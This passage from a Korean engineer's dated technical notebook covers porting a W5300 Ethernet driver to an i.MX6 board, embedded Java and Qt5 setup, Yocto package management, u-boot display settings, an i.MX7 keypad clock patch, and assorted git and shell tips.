2.  firefox 설정  
    about:config -> layout.css.devPixelsPerPx  
    -1 에서 1.5로 변경
3.  panel properties  
    pixel 값 29 에서 32로 변경
4.  conky  
    maximum\_width 280 에서 310  
    xftfont size 8 에서 10 으로 변경


### <span class="section-num">3.155</span> w5300 포팅 {#w5300-포팅}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-19 수 09:41&gt;</span></span>  


### <span class="section-num">3.156</span> w5300 포팅                                           :w5300:wiznet:tcpip:NXP:FreeScale {#w5300-포팅-w5300-wiznet-tcpip-nxp-freescale}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-19 수 09:44&gt;</span></span>  
wiznet w5300 칩을 NXP I.MX6 보드에 포팅한 과정을 서술한다.  
포팅하고자 하는 보드의 경우 커널 4.1.15 버전이고 w5300드라이버가커널에 포함되어 있다.  
디바이스 트리에서 핀연결을 정의하고 관련 드라이버 설정을 정의해주면 된다.  
나는 EIM 버스를 사용하여 w5300을 연결하였다. NXP의 WEIM nor 설정을변경하여 작성하였다.  
디바이스 트리에서 compatible 지시자를 사용하고 디바이스 드라이버에서같은 이름이 match 가 되면 자동으로 디바이스를 등록한다.  


#### <span class="section-num">3.156.1</span> Device Tree 소스 변경 {#device-tree-소스-변경}

```text
&weim {
	pinctrl-names = "default";
	pinctrl-0 = <&pinctrl_weim_nor &pinctrl_weim_cs0 &pinctrl_weim_cs1 &pinctrl_weim_cs_alt>;
	#address-cells = <2>;
	#size-cells = <1>;
	ranges = <0 0 0x08000000 0x02000000
	          1 0 0x0a000000 0x02000000
	          2 0 0x0c000000 0x02000000
	          3 0 0x0e000000 0x02000000>;
	fsl,weim-cs-gpr = <&gpr>;
	status = "okay"; /* pin conflict with SPI NOR */

	w5300@0,1,0 {
		compatible = "w5300";
		reg = <1 0 0x200000>;
		#address-cells = <1>;
		#size-cells = <1>;
		bank-width = <2>;
		fsl,weim-cs-timing = <0x00620081 0x00000001 0x1c022000
				0x0000c000 0x1404a38e 0x00000000>;
		interrupt-parent = <&gpio1>;
		interrupts = <8 IRQ_TYPE_LEVEL_LOW>;
	};
...
}
```


#### <span class="section-num">3.156.2</span> W5300 Driver 변경 {#w5300-driver-변경}

```text
+static const struct of_device_id of_w5300_match[] = {
+	{
+		.compatible	= "w5300",
+	},
+	{ },
+};
+MODULE_DEVICE_TABLE(of, of_w5300_match);
+
 static struct platform_driver w5300_driver = {
 	.driver		= {
 		.name	= DRV_NAME,
+		.of_match_table = of_w5300_match,
 		.pm	= &w5300_pm_ops,
 	},
 	.probe		= w5300_probe,
```


### <span class="section-num">3.157</span> install via usbstick {#install-via-usbstick}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-21 금 09:58&gt;</span></span>  


#### <span class="section-num">3.157.1</span> linuxmint {#linuxmint}

```text
$ sudo dd if=~/Desktop/linuxmint.iso of=/dev/sdx oflag=direct  bs=1048576
$ sudo sync
```


#### <span class="section-num">3.157.2</span> debian {#debian}

```text
$ sudo cp debian.iso /dev/sdx && sudo sync
```


### <span class="section-num">3.158</span> default java config {#default-java-config}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-26 수 11:47&gt;</span></span>  
debian 계열에서 default java 를 설정하는 방법이다.  
update-java-alternatives 명령은 java 에 대해서만설정이 된다.  
oracle-java6-set-default 처럼 전체 환경을 설정하는명령이 없다. 수동으로 일일이 설정해야만 한다.  

```text
$ sudo update-alternatives --config java
$ sudo update-alternatives --config javac
$ sudo update-alternatives --config javap
$ sudo update-alternatives --config javah
$ sudo update-alternatives --config javaws
$ sudo update-alternatives --config jar
$ sudo update-alternatives --config javadoc
```


### <span class="section-num">3.159</span> make menuconfig error {#make-menuconfig-error}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-28 금 17:24&gt;</span></span>  
linux kernel menuconfig 시 아래 에러 발생  

```text
ybgwon@mint ~/yt/git/k $ make menuconfig
 *** Unable to find the ncurses libraries or the
 *** required header files.
 *** 'make menuconfig' requires the ncurses libraries.
 *** 
 *** Install ncurses (ncurses-devel) and try again.
 *** 
scripts/kconfig/Makefile:187: 'scripts/kconfig/dochecklxdialog' 타겟에 대한 명령이 실패했습니다
make[1]: *** [scripts/kconfig/dochecklxdialog] 오류 1
Makefile:541: 'menuconfig' 타겟에 대한 명령이 실패했습니다
make: *** [menuconfig] 오류 2
```

하지만 libncurses5-dev 패키지가 이미 설치되어 있는 걸로 나온다.  
libncursesw5-dev 도 설치해야 한다고 한다.  
[askubuntu](https://askubuntu.com/questions/270381/how-do-i-install-ncurses-header-files)  


### <span class="section-num">3.160</span> Disable swap {#disable-swap}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-07-31 월 16:38&gt;</span></span>  
기존의 swapoff 과정은 다음과 같다.  

1.  먼저 모든 디바이스 swap off  
    
    ```text
    $ swapoff -a
    ```
2.  /etc/fstab 에서 swap device 주석처리
3.  /etc/initramfs-tools/conf.d/resume 파일에서  
    swap device 주석처리

systemd 를 사용한다면 아래 명령을 해주어야 한다.  

```text
$ sudo systemctl mask dev-sdXX.swap
```


#### <span class="section-num">3.160.1</span> 링크 {#링크}

[serverfault](https://serverfault.com/questions/684771/best-way-to-disable-swap-in-linux)  


### <span class="section-num">3.161</span> Nexell 보드에 oracle embedded java 설치 {#nexell-보드에-oracle-embedded-java-설치}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-07 월 16:36&gt;</span></span>  

1.  Oracle Technology Network -> Java -> Java Embedded ->  
    Java SE Embedded -> Downloads 에서  
    ejdk-8u144-linux-arm-sflt.tar.gz 파일 다운로드
2.  호스트에서 압축을 풀고 bin 디렉토리에서 jrecreaste.sh 실행  
    
    ```text
    $ installDir/ejdk<version>/bin/jrecreate.sh \
     --dest /tmp/exampleJRE3 
    ```
    
    $JAVA\_HOME 변수가 설정 되어 있지 않아 에러가 난다.  
    데비안 계열에서 openjdk 패키지가 설치되어 있다면 굳이  
    $JAVA\_HOME을  설정하지 않아도 되므로 변수 체크부분을주석처리 하고 $JAVA\_HOME/bin/java 명령어를 java 로대체한 다음 위 명령을 실행한다.
3.  &#x2013;dest에 지정한 폴더에 설치된 파일들을 타겟 디바이스에복사한 다음 bin 디렉토리의 PATH를 잡아준다.


### <span class="section-num">3.162</span> java embedded 한글 지원 {#java-embedded-한글-지원}

jrecreate.sh에서 jre를 빌드할 때 extention 옵션에 locale,charset 추가  

```text
$ ./jrecreate.sh --extension locales,charsets --dest /tmp/exampleJRE3 
```


### <span class="section-num">3.163</span> imx6 java porting {#imx6-java-porting}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-08 화 11:46&gt;</span></span>  

1.  Oracle Technolocy Network -> Java -> Java SE -> Downloads  
    jdk-8u144-linux-arm32-vfp-hflt.tar.gz 파일 다운로드
2.  보드에 압축 풀고 bin 디렉토리 패스 잡아주면 끝
3.  Demo file 실행하려면 DISPLAY 변수 설정해야함

<!--listend-->

```text
$ tar zxvf jdk-8u144-linux-arm32-vfp-hflt.tar.gz -C /opt
$ export PATH=$PATH:/opt/jdk1.8.0_144/bin
// Demo file test
$ tar zxvf jdk-8u144-linux-arm32-vfp-hflt-demos.tar.gz
$ export DISPLAY=:0.0
$ cd jdk1.8.0_144/demo/jfc/Notepad
$ java -jar Notepad.jar
```


### <span class="section-num">3.164</span> git 이미 인덱스에 포함된 디렉토리 제외하기 {#git-이미-인덱스에-포함된-디렉토리-제외하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-08-31 목 20:28&gt;</span></span>  

```text
$ git rm -r --cached bin
```


### <span class="section-num">3.165</span> git 특정 해쉬 커밋만 보기 {#git-특정-해쉬-커밋만-보기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-09-01 금 14:18&gt;</span></span>  

```text
ybgwon@mint ~/yt/git/k $ git show 76aeddc
commit 76aeddccdcf663ca83a4ae32e9650eb35a229d9c
Author: Sandor Yu <Sandor.yu@nxp.com>
Date:   Wed Aug 3 15:06:57 2016 +0800

    MLK-12997: dts: hdmicec: Fix hdmicec pinctrl setting error
    
    Fix hdmicec pinctrl setting error.
    
    Signed-off-by: Sandor Yu <Sandor.yu@nxp.com>

diff --git a/arch/arm/boot/dts/imx6qdl-sabreauto.dtsi b/arch/arm/boot/dts/imx6qdl-sabreauto.dtsi
index 47f9f42..711cc63 100644
--- a/arch/arm/boot/dts/imx6qdl-sabreauto.dtsi
+++ b/arch/arm/boot/dts/imx6qdl-sabreauto.dtsi
@@ -966,12 +966,12 @@
 				MX6QDL_PAD_EIM_DA0__EIM_AD00		0xb0b1
 			>;
 		};
-	};
 
-	pinctrl_hdmi_cec: hdmicecgrp {
-		fsl,pins = <
-			MX6QDL_PAD_EIM_A25__HDMI_TX_CEC_LINE 0x1f8b0
-		>;
+		pinctrl_hdmi_cec: hdmicecgrp {
+			fsl,pins = <
+				MX6QDL_PAD_EIM_A25__HDMI_TX_CEC_LINE 0x1f8b0
+			>;
+		};
 	};
 };
```


### <span class="section-num">3.166</span> dns 설정 :dns:resolv.conf: {#dns-설정-dns-resolv-dot-conf}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-09-07 목 11:20&gt;</span></span>  
리눅스 시스템에서 dns 서버를 지정하는 파일은 /etc/resolv.conf 이다.  
이전에는 이 파일을 수동으로 편집하여 시스템에 맞는 dns 서버를설정하였다. 하지만 요즘(2017-09-07)은 이게 자동으로 설정된다.  
어떠한 이유로 자동으로 이 파일에 nameserver 가 설정되지 않았을때자동으로 설정하는 명령이 있다.  

```text
$ sudo resolvconf -u
```

물론 NetworkManager 등에서 DNS 설정이 되어 있어야 하겠다.  


### <span class="section-num">3.167</span> Freescale memory read write tool {#freescale-memory-read-write-tool}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-09-25 월 16:28&gt;</span></span>  

```text
root@imx6qsabresd:/unit_tests# ./memtool  
Usage:

Read memory: memtool [-8 | -16 | -32] <phys addr> <count>
Write memory: memtool [-8 | -16 | -32] <phys addr>=<value>

List SOC module: memtool *. or memtool .
Read register:  memtool UART1.*
                memtool UART1.UMCR
                memtool UART1.UMCR.MDEN
                memtool UART1.-
Write register: memtool UART.UMCR=0x12
                memtool UART.UMCR.MDEN=0x1
Default access size is 32-bit.

Address, count and value are all in hex.
```


### <span class="section-num">3.168</span> GIT 리모트 저장소 특정 브랜치 가져오기 {#git-리모트-저장소-특정-브랜치-가져오기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-10-25 수 10:54&gt;</span></span>  
freescale 의 i.MX6 새로운 릴리즈가 올라와서 git 으로새 릴리즈 브랜치를 가져오는 방법이다.  
$ git fetch origin 명령을 시도했지만 실패했다.  
사이즈가 너무 커서 인듯하다. 그래서 새로운 릴리즈 브랜치만가져오기로 했다.  

1.  리모트 브랜치 내용을 확인한다.  
    
    ```text
    $ git ls-remote origin
    ```
    
    or  
    
    ```text
    $ git ls-rmote --heads origin
    6eefa0c21fd6b2ce9058ab53d375430ba13673d7	refs/heads/imx_3.10.17_1.0.0_ga
    10135c736dfc1b3d5c449adb78118e3642b99276	refs/heads/imx_3.10.53_1.1.0_ga
    dc9e58c0809abc8e34813e5724e69ded766dd6a0	refs/heads/imx_3.14.28_1.0.0_ga
    ad37eebd4b27a81080b655034e45521f064a7a09	refs/heads/imx_3.14.52_1.1.0_ga
    da4e78f28218038f7c5dc5f4b6041958c17a4711	refs/heads/imx_4.1.15_1.0.0_ga
    30278abfe0977b1d2f065271ce1ea23c0e2d1b6e	refs/heads/imx_4.1.15_2.0.0_ga
    c12b0f0a1440a3890680f3e9f8d610be75ac9a7a	refs/heads/imx_4.1.30_7ulp_alpha
    4f882165cc31672f3c98de74ab02b757cb96ad26	refs/heads/imx_4.1.33_7ulp_beta
    c27010d99a3d91703ea2d1a3f9630a9dedc3f86f	refs/heads/imx_4.9.11_1.0.0_ga
    7a75e7f70b432897c9cb5c4d578b83e57fcf217b	refs/heads/scm-imx_4.1.15_2.0.0_ga
    ```
2.  원하는 특정 릴리즈 브랜치만 가져온다.  
    
    ```text
    $ git fetch origin refs/heads/imx_4.9.11_1.0.0_ga
    ```
3.  tag 목록도 가져온다.  
    
    ```text
    $ git fetch --tags origin
    ```
4.  새 릴리즈 브랜치를 같은 이름으로 체크아웃한다.  
    
    ```text
    $ git checkout -t origin/imx_4.9.11_1.0.0_ga
    ```


### <span class="section-num">3.169</span> rotate display with xrandr {#rotate-display-with-xrandr}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-01 수 17:05&gt;</span></span>  

```text
$ export DISPLAY=:0
$ xrandr -o left
```


### <span class="section-num">3.170</span> 소스 파일 코딩 스타일 변경 {#소스-파일-코딩-스타일-변경}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-07 화 13:46&gt;</span></span>  
남이 작성한 소스 코드의 코딩 스타일이 마음에 들지 않아 일괄 변환할 때유용하다.  

1.  도움말  
    
    ```text
    /usr/share/doc/astyle/html/astyle.html 또는
    $ astyle -h
    ```
2.  변환  
    -A4 Stroustrup style formatting/indenting brackets  
    -n 옵션은 backup 파일을 만들지 않는다.  
    -r 옵션은 하위 디렉토리까지 변환한다.  
    -z2 lineend=linux  
    
    ```text
    $ astyle -A4 -nr -z2 *.c *.h
    ```


### <span class="section-num">3.171</span> git ignore have aleady have been commited file {#git-ignore-have-aleady-have-been-commited-file}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-07 화 14:12&gt;</span></span>  

```text
$ git rm -r --cached some/files
```


### <span class="section-num">3.172</span> shell array print reverse order {#shell-array-print-reverse-order}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-09 목 13:30&gt;</span></span>  

```text
$ for i in 0 4 8 16 32 64 128 255; do echo -n "$i "; done|tac -s " "
255 128 64 32 16 8 4 0 
```


### <span class="section-num">3.173</span> Obtain kernel config from currently running Linux system {#obtain-kernel-config-from-currently-running-linux-system}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-10 금 19:57&gt;</span></span>  

```text
$ zcat /proc/config.gz
```

커널 빌드시 아래 설정이 되어 있어야 한다.  

```text
General setup
    [*] Kernel .config support
        [*] Enable access to .config through /proc/config.gz
```


#### <span class="section-num">3.173.1</span> 링크 - [superuser](https://superuser.com/questions/287371/obtain-kernel-config-from-currently-running-linux-system) {#링크-superuser}


### <span class="section-num">3.174</span> imx6 lvds, hdmi display mode 설정 {#imx6-lvds-hdmi-display-mode-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-13 월 10:23&gt;</span></span>  

1.  lvds display  
    
    ```text
    $ setenv display video=mxcfb0:dev=ldb,if=RGB888
    ```
2.  lvds 구버전  
    
    ```text
    video=mxcfb0:dev=ldb,LDB-1080P60,if=RGB24,bpp=32 ldb=spl0 fbmem=24M
    ```
3.  hdmi disply  
    
    ```text
    $ setenv display video=mxcfb0:dev=hdmi,1920x1080M@60,if=RGB24
    ```


### <span class="section-num">3.175</span> pamir u-boot environment {#pamir-u-boot-environment}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-16 목 10:37&gt;</span></span>  

```text
mmcargs=setenv bootargs console=${console},${baudrate} root=${mmcroot} root2=/dev/mmcblk1p1 video=mxcfb0:dev=ldb,LDB-XGA,if=RGB24,rotate=4 consoleblank=0 video=mxcfb1:off quiet printk.time=1
```


### <span class="section-num">3.176</span> qt eglfs error 해결 {#qt-eglfs-error-해결}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-17 금 10:04&gt;</span></span>  

```text
EGL Error : Could not create the egl surface: error = 0x3003
```

위와 같은 에러를 내며 qt 데모 프로그램이 실행이 되지 않을 경우  
framebuffer 의 bpp 셋팅이 32bit로 설정되어 있는지 확인하라.  

```text
$ echo 32 > /sys/class/graphics/fb0/bits_per_pixel
```

아예 디바이스트리에서 mxcfb의 default\_bbp 를 32로 설정해도 된다.  


#### <span class="section-num">3.176.1</span> 참조 {#참조}

[Qt forum](https://forum.qt.io/topic/69210/egl-error-could-not-create-the-egl-surface-error-0x3003/3)  


### <span class="section-num">3.177</span> Qt 5 예제 실행 {#qt-5-예제-실행}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-17 금 10:14&gt;</span></span>  
nxp 에서 제공하는 qt5 graphic backends 는 다음과 같다.  

X11 에서 실행시는 다음을 실행하고 해야 한다.  

```text
$ export DISPLAY=:0.0
$ xhost +
```

데모 실행  

```text
$ export GRAPHICS=eglfs
```

1.  ```text
    $ Qt5_CinematicExperience -platform ${GRAPHICS} -plugin evdevtouch:/dev/input/event0
    ```
2.  ```text
    $ /usr/share/qt5nmapcarousedemo-1.0/Qt5_NMap_CarouselDemo -platform ${GRAPHICS} -plugin evdevtouch:/dev/input/event0
    ```
3.  ```text
    $ /usr/bin/qt5/qmlscene -platform ${GRAPHICS} -plugin evdevtouch:/dev/input/event0 /usr/share/qt5ledscreen-1.0/example_billboard.qml
    ```


### <span class="section-num">3.178</span> qt5 rotate {#qt5-rotate}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-17 금 14:59&gt;</span></span>  

1.  OpenGL-based windows  
    아래를 qml 파일에 추가한다. 마우스는 rotation되지 않는다.  
    
    ```text
    transform: [                                                                
         Rotation {                                                              
             angle: 270                                                              
             origin.x: root.width / 2                                                
             origin.y: root.height / 2                                               
         }                                                                       
     ]           
    ```
2.  QWidget based windows  
    
    ```text
    $ export QT_QPA_EGLFS_ROTATION=90
    ```


### <span class="section-num">3.179</span> build qt5 toolchain {#build-qt5-toolchain}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-21 화 10:49&gt;</span></span>  

```text
$ bitbake meta-toolchain-qt5
```


### <span class="section-num">3.180</span> yocto package management {#yocto-package-management}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-21 화 16:57&gt;</span></span>  
apt 처럼 yocto 패키지를 관리 할 수 있다.  


#### <span class="section-num">3.180.1</span> host {#host}

1.  conf/local.conf 파일에 package-management 를 추가 하고재빌드 하면 smart 패키지 매지저가 rootfs에 추가 된다.  
    
    ```text
    EXTRA_IMAGE_FEATURES = "debug-tweaks package-management"
    ```
2.  build image  
    
    ```text
    $ bitbake fsl-image-qt5-validation-imx 
    ```
3.  web server 에서 tmp/deploy/rpm 디렉토리를 억세스 할 수 있게한다.  
    
    ```text
    $ sudo ln -s $HOME/<build>/tmp/deploy/rpm /var/www/html/imx
    ```
4.  패키지 인덱스를 갱신한다.  
    
    ```text
    $ bitbake package-index
    ```


#### <span class="section-num">3.180.2</span> target {#target}

1.  패키지 서버의 채널을 추가한다.  
    
    ```text
    $ smart channel --add all type=rpm-md name=all baseurl=http://192.168.0.2/imx/all
    $ smart channel --add cortexa9hf_neon_mx6qdl type=rpm-md name=cortexa9hf_neon_mx6qdl baseurl=http://192.168.0.2/imx/cortexa9hf_neon_mx6qdl
    $ smart channel --add imx6qsabresd type=rpm-md name=imx6qsabresd baseurl=http://192.168.0.2/imx/imx6qsabresd
    ```
2.  local package cache update  
    
    ```text
    $ smart update
    ```
3.  패키지 검색  
    
    ```text
    $ smart search webengine
    ```
4.  패키지 설치  
    
    ```text
    $ smart install qtwebengine-examples
    ```


### <span class="section-num">3.181</span> imx qt5 web package 설치 {#imx-qt5-web-package-설치}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-21 화 17:11&gt;</span></span>  
conf/local.conf 파일에 추가  

```text
CORE_IMAGE_EXTRA_INSTALL += "packagegroup-qt5-webengine"
```


### <span class="section-num">3.182</span> imx ddr stress test tool 사용법 {#imx-ddr-stress-test-tool-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-22 수 19:57&gt;</span></span>  

1.  ddr script aid 엑셀 파일을 사용하여 init script 파일을만든다. (exam:samsung2g.inc)
2.  위 파일에서 아래를 주석처리한다.  
    
    ```text
    wait = on
    setmem /16 0x020bc000 = 0x30 
    ```
3.  DDR\_Tester.exe 를 실행시키고 Load init scpirt 버터에서위파일을 로드하고 MR1=0004, DDR Freq=528 로 설정한 다음  
    Calibration 을 한다.
4.  Stress Test를 하려면 Start 와 End Freq 에 528Mhz 의 +-10%  
    475 ~ 581 정도 기입한 다음 Stress Test 버턴을 눌러 실행한다.


### <span class="section-num">3.183</span> diff 에서 공백 문자 무시 할 때 {#diff-에서-공백-문자-무시-할-때}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-24 금 19:09&gt;</span></span>  
w 옵션을 사용한다.  
-w, &#x2013;ignore-all-space          ignore all white space  

```text
$ diff -Nauws a.txt b.txt
```


### <span class="section-num">3.184</span> xmllint 사용법 {#xmllint-사용법}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-24 금 19:12&gt;</span></span>  

1.  xml 파일 포멧팅  
    
    ```text
    $ xmllint --format --recover pom.xml > new-pom.xml
    ```
2.  노드에서 특정 텍스트 파싱  
    
    ```text
    $ xmllint --xpath '/breakfast_menu/food[1]/price/text()' simple.xml
    ```


#### <span class="section-num">3.184.1</span> 링크 {#링크}

<https://www.lesstif.com/pages/viewpage.action?pageId=9437338>  
<https://bakyeono.net/post/2015-06-01-parse-xml-with-xmllint.html>  
[linux.byexamples.com](http://linux.byexamples.com/archives/565/your-xml-friend-xpath-command-line-xmllint/)  


### <span class="section-num">3.185</span> whitespace 제거 {#whitespace-제거}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-11-24 금 19:21&gt;</span></span>  

```text
$ cat input.txt | sed 's/^[ \t]*//;s/[ \t]*$//' > output.txt
```

[nixcraft](https://www.cyberciti.biz/tips/delete-leading-spaces-from-front-of-each-word.html)  


### <span class="section-num">3.186</span> shell redirect error and output {#shell-redirect-error-and-output}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-12-15 금 10:46&gt;</span></span>  

1.  error 와 output 모두 출력을 원치 않을때  
    /dev/null 로  redirection 한다.  
    
    ```text
    $ ./script.sh > /dev/null 2>&1
    or
    $ ./script.sh &> /dev/null 
    ```
2.  error 와 output 모두를 로그 파일에 저장할 때  
    
    ```text
    $ ./script.sh &> logfile
    ```


### <span class="section-num">3.187</span> IMX7D boot {#imx7d-boot}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2017-12-27 수 16:05&gt;</span></span>  


#### <span class="section-num">3.187.1</span> boot switch {#boot-switch}


#### <span class="section-num">3.187.2</span> u-boot args {#u-boot-args}

```text
U-boot > setenv bootargs console=ttymxc0,115200 init=/init androidboot.console=ttymxc0 consoleblank=0 androidboot.hardware=freescale no_console_suspend=1
```


### <span class="section-num">3.188</span> icon 위치 찾기 {#icon-위치-찾기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-01-03 수 15:54&gt;</span></span>  
데스크탑에 있는 아이콘의 그림파일 원본의 위치를 알고자 할 때  

1.  Open Gedit
2.  Drag the launcher into the Gedit window
3.  Look for the Icon definition:  
    Icon=gnome-panel-launcher

만약 아이콘 경로가 나타나지 않고 위처럼 이름만 나온다면아래 스크립트를 실행한다.  

```text
import gtk

print "enter the icon name (case sensitive):"
icon_name = raw_input(">>> ")
icon_theme = gtk.icon_theme_get_default()
icon = icon_theme.lookup_icon(icon_name, 48, 0)
if icon:
    print icon.get_filename()
else:
    print "not found"
```

[askubuntu](https://askubuntu.com/questions/52430/how-can-i-find-the-location-of-an-icon-of-a-launcher-in-use)  


### <span class="section-num">3.189</span> reload udev rules {#reload-udev-rules}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-01-04 목 12:02&gt;</span></span>  

```text
$ sudo udevadm control --reload-rules && sudo udevadm trigger
```

[stackexchange](https://unix.stackexchange.com/questions/39370/how-to-reload-udev-rules-without-reboot)  


### <span class="section-num">3.190</span> ipython run program {#ipython-run-program}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-01-07 일 11:01&gt;</span></span>  

```text
In [84]: run ./1_7_socket_errors.py --host="www.google.com" --port=80
```


### <span class="section-num">3.191</span> disable blinking cursor at boot time {#disable-blinking-cursor-at-boot-time}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-01-25 목 16:01&gt;</span></span>  
커널 cmdline 에 다음을 추가한다.  
안드로이드 에서는 device/fsl/sabresd\_7d/BoardConfig.mk 의  
BOARD\_KERNEL\_CMDLINE 을 변경해야 한다.  

```text
vt.global_cursor_default=0
```

<https://developer.toradex.com/knowledge-base/splash-screen-linux>  


### <span class="section-num">3.192</span> Android 부팅시 "A N D R O I D \_" text 없애기 {#android-부팅시-a-n-d-r-o-i-d-text-없애기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-01-25 목 16:07&gt;</span></span>  
안드로이드 부팅시 리눅스 로고 이후  
A N D R O I D \_  
문자가 화면에 표시된다. 더군다나 안드로이드 출력을 회전이라도 한경우에 부팅시 이 문자는 회전되어 출력되지 않는다.  
소스에서 이부분을 주석처리 하여야 한다.  
system/core/init/init.cpp  

```text
static int console_init_action(const std::vector<std::string>& args)
{
    std::string console = property_get("ro.boot.console");
    if (!console.empty()) {
        console_name = "/dev/" + console;
    }

    int fd = open(console_name.c_str(), O_RDWR | O_CLOEXEC);
    if (fd >= 0)
        have_console = 1;
    close(fd);

#if 0                           // Do not Display Text
    fd = open("/dev/tty0", O_WRONLY | O_CLOEXEC);
    if (fd >= 0) {
        const char *msg;
            msg = "\n"
        "\n"
        "\n"
        "\n"
        "\n"
        "\n"
        "\n"  // console is 40 cols x 30 lines
        "\n"
        "\n"
        "\n"
        "\n"
        "\n"
        "\n"
        "\n"
        "             A N D R O I D ";
        write(fd, msg, strlen(msg));
        close(fd);
    }
#endif
    return 0;
}
```

[stackoveflow](https://stackoverflow.com/questions/27652738/cursor-blinking-with-text-a-n-d-r-o-i-d-after-boot-logo-while-android-boot-u)  
<http://www.programering.com/a/MDMykTNwATc.html>  


### <span class="section-num">3.193</span> linux boot logo 변경하기 {#linux-boot-logo-변경하기}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-01-25 목 16:43&gt;</span></span>  
image를 LCD에 맞게 변경  

```text
$ convert -resize 272x480\! -rotate 270 momo.jpg momo2.jpg
```

linux logo 만들기  

```text
$ apt install netpbm
$ jpegtopnm momo2.jpg  > logo.ppm
$ ppmquant 224 logo.ppm >logo_224.tmp
$ pnmnoraw logo_224.tmp > logo_linux_clut224.ppm
$ cp logo_linux_clut224.ppm $KERNEL/drivers/video/logo
```

<http://www.rasplay.org/?p=6371>  


### <span class="section-num">3.194</span> imx7d matrix keypad 설정 {#imx7d-matrix-keypad-설정}

<span class="timestamp-wrapper"><span class="timestamp">&lt;2018-02-01 목 18:56&gt;</span></span>  
matrix keypad 설정을 하려면 우선 pinmux에서 key\_col, key\_low  
핀을 mux 설정하여야 한다.  
아래는 device tree 예제이다.  

```text
&kpp {
	pinctrl-names = "default";
	pinctrl-0 = <&pinctrl_kpp>;
	/* sample keymap */
	/* row/col 0..3 are mapped to KPP row/col 4..7 */
	linux,keymap = <
		MATRIX_KEY(0x0, 0x0, KEY_1)
		MATRIX_KEY(0x0, 0x1, KEY_4)
		MATRIX_KEY(0x0, 0x2, KEY_7)
            ...
	>;
	status = "okay";
};

pinctrl_kpp: kppgrp {
fsl,pins = <
                MX7D_PAD_ENET1_RGMII_TD0__KPP_ROW0	0x0003c
                MX7D_PAD_ENET1_RGMII_RX_CTL__KPP_ROW1	0x0003c
                MX7D_PAD_ENET1_RGMII_RD2__KPP_ROW2	0x0003c
                MX7D_PAD_ENET1_RGMII_TD1__KPP_COL0      0x0003c
                MX7D_PAD_ENET1_RGMII_RXC__KPP_COL1	0x0003c
                MX7D_PAD_ENET1_RGMII_RD3__KPP_COL2	0x0003c
                ...
        >;
};
```

원래 위 설정만 하면 동작하여야 한다. 그러나 부팅시 아래 에러와 함께멈춘다.  

```text
[1.376636] input: 30320000.kpp as /devices/platform/soc/30000000.aips-bus/30320000.kpp/input/input0
```

imx7d 는 clock 관련 패치를 더 해 주어야 한다.  

```text
--- a/arch/arm/boot/dts/imx7d.dtsi
+++ b/arch/arm/boot/dts/imx7d.dtsi
@@ -604,7 +604,7 @@
 				compatible = "fsl,imx7d-kpp", "fsl,imx21-kpp";
 				reg = <0x30320000 0x10000>;
 				interrupts = <GIC_SPI 80 IRQ_TYPE_LEVEL_HIGH>;
-				clocks = <&clks IMX7D_CLK_DUMMY>;
+				clocks = <&clks IMX7D_KPP_CLK>;
 				status = "disabled";
 			};
 
diff --git a/arch/arm/mach-imx/clk-imx7d.c b/arch/arm/mach-imx/clk-imx7d.c
index c3e39eb..f5cadf7 100644
--- a/arch/arm/mach-imx/clk-imx7d.c
+++ b/arch/arm/mach-imx/clk-imx7d.c
@@ -789,6 +789,7 @@ static void __init imx7d_clocks_init(struct device_node *ccm_node)
 	clks[IMX7D_OCRAM_CLK] = imx_clk_gate4("ocram_clk", "axi_post_div", base + 0x4110, 0);
 	clks[IMX7D_OCRAM_S_CLK] = imx_clk_gate4("ocram_s_clk", "ahb_root_clk", base + 0x4120, 0);
 	clks[IMX7D_CAAM_CLK] = imx_clk_gate4("caam_clk", "ipg_root_clk", base + 0x4240, 0);
+	clks[IMX7D_KPP_CLK] = imx_clk_gate4("kpp_clk", "ipg_root_clk", base + 0x4aa0, 0);
 	clks[IMX7D_DRAM_ROOT_CLK] = imx_clk_gate4("dram_root_clk", "dram_post_div", base + 0x4130, 0);
 	clks[IMX7D_DRAM_PHYM_ROOT_CLK] = imx_clk_gate4("dram_phym_root_clk", "dram_phym_cg", base + 0x4130, 0);
 	clks[IMX7D_DRAM_PHYM_ALT_ROOT_CLK] = imx_clk_gate4("dram_phym_alt_root_clk", "dram_phym_alt_post_div", base + 0x4130, 0);
